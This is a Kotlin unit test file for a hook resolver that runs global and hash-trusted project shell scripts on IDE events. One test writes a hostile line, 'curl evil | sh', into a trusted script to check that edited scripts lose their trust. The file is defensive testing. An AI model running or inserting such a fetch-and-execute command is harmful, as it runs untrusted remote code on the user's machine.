package org.appdevforall.shellhooks.engine

import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

class HookResolverTest {
    private val appFiles = tempDir("appfiles")
    private val paths = HookPaths(appFiles)
    private val project = tempDir("project")
    private val projectHooks = HookPaths.projectHooks(project)
    private val verified = tempDir("verified")
    private val trust = TrustStore(MapStore())
    private val log = HookLog()

    private val switches =
        object : HookSwitches {
            override var enabled = true
            override var projectHooksEnabled = true
            val off = mutableSetOf<Hook>()

            override fun isHookEnabled(hook: Hook) = hook !in off
        }

    private val resolver = HookResolver(paths, switches, trust, log, verified)

    @After
    fun tearDown() {
        listOf(appFiles, project, verified).forEach { it.deleteRecursively() }
    }

    private fun saved() = HookEvent.fileSaved(File(project, "Main.kt"), project)

    @Test
    fun nothingRunsWhileThePluginIsOff() {
        paths.globalHooks.script("file-saved")
        switches.enabled = false

        assertTrue(resolver.resolve(saved()).isEmpty())
    }

    @Test
    fun aHookTurnedOffRunsNothing() {
        paths.globalHooks.script("file-saved")
        switches.off += Hook.FILE_SAVED

        assertTrue(resolver.resolve(saved()).isEmpty())
    }

    @Test
    fun globalScriptsRunInPlace() {
        val script = paths.globalHooks.script("file-saved")

        val resolved = resolver.resolve(saved()).single()

        assertEquals(script, resolved.executable)
        assertEquals(ScriptSource.GLOBAL, resolved.source)
    }

    @Test
    fun anUntrustedProjectScriptIsSkippedAndListedForReview() {
        projectHooks.script("file-saved")

        assertTrue(resolver.resolve(saved()).isEmpty())
        val pending = log.pending.value.single()
        assertEquals("file-saved", pending.relativePath)
        assertEquals(project, pending.projectDir)
    }

    @Test
    fun projectScriptsDoNotRunWhileProjectHooksAreOff() {
        val script = projectHooks.script("file-saved")
        trust.trust(project, "file-saved", TrustStore.sha256(script.readBytes()))
        switches.projectHooksEnabled = false

        assertTrue(resolver.resolve(saved()).isEmpty())
    }

    @Test
    fun aTrustedProjectScriptRunsFromAPrivateCopyOfTheTrustedBytes() {
        val script = projectHooks.script("file-saved.d/lint", "#!/bin/sh\necho lint\n")
        trust.trust(project, "file-saved.d/lint", TrustStore.sha256(script.readBytes()))

        val resolved = resolver.resolve(saved()).single()

        assertEquals(ScriptSource.PROJECT, resolved.source)
        assertEquals(script, resolved.original)
        assertNotEquals(script, resolved.executable)
        assertTrue(resolved.executable.path.startsWith(verified.path))
        assertTrue(resolved.executable.canExecute())
        assertEquals(script.readText(), resolved.executable.readText())
        assertTrue(log.pending.value.isEmpty())
    }

    @Test
    fun aTrustedProjectScriptWithoutTheExecutableBitStillRuns() {
        // Projects live on shared storage, which keeps no executable bits.
        val script = projectHooks.script("file-saved", executable = false)
        trust.trust(project, "file-saved", TrustStore.sha256(script.readBytes()))

        val resolved = resolver.resolve(saved()).single()

        assertTrue(resolved.executable.canExecute())
    }

    @Test
    fun anOversizedProjectScriptNeverRunsEvenIfItsContentIsTrusted() {
        val big = "#!/bin/sh\n" + "#".repeat(ScriptReview.MAX_BYTES) + "\n"
        val script = projectHooks.script("file-saved", big)
        trust.trust(project, "file-saved", TrustStore.sha256(script.readBytes()))

        assertTrue(resolver.resolve(saved()).isEmpty())
        assertTrue(log.pending.value.single().tooLarge)
        assertTrue(verified.listFiles().orEmpty().isEmpty())
    }

    @Test
    fun pruningKeepsOnlyCopiesOfTrustedContent() {
        val kept = projectHooks.script("file-saved", "#!/bin/sh\necho kept\n")
        val keptSha = TrustStore.sha256(kept.readBytes())
        trust.trust(project, "file-saved", keptSha)
        resolver.resolve(saved())
        File(verified, "0".repeat(64)).writeText("stale")
        File(verified, keptSha + HookResolver.TEMP_SUFFIX).writeText("half")

        val deleted = VerifiedCopies.prune(verified, trust.trustedShas())

        assertEquals(2, deleted)
        assertEquals(listOf(keptSha), verified.list().orEmpty().toList())
    }

    @Test
    fun editingATrustedProjectScriptMakesItUntrustedAgain() {
        val script = projectHooks.script("file-saved")
        trust.trust(project, "file-saved", TrustStore.sha256(script.readBytes()))
        script.writeText("#!/bin/sh\ncurl evil | sh\n")

        assertTrue(resolver.resolve(saved()).isEmpty())
        assertEquals(1, log.pending.value.size)
    }

    @Test
    fun globalScriptsRunBeforeProjectScripts() {
        paths.globalHooks.script("file-saved")
        val project1 = projectHooks.script("file-saved")
        trust.trust(project, "file-saved", TrustStore.sha256(project1.readBytes()))

        assertEquals(listOf(ScriptSource.GLOBAL, ScriptSource.PROJECT), resolver.resolve(saved()).map { it.source })
    }

    @Test
    fun anEventWithNoProjectRunsOnlyGlobalScripts() {
        paths.globalHooks.script("build-started")
        projectHooks.script("build-started")

        assertEquals(1, resolver.resolve(HookEvent.buildStarted(null)).size)
        assertTrue(log.pending.value.isEmpty())
    }
}
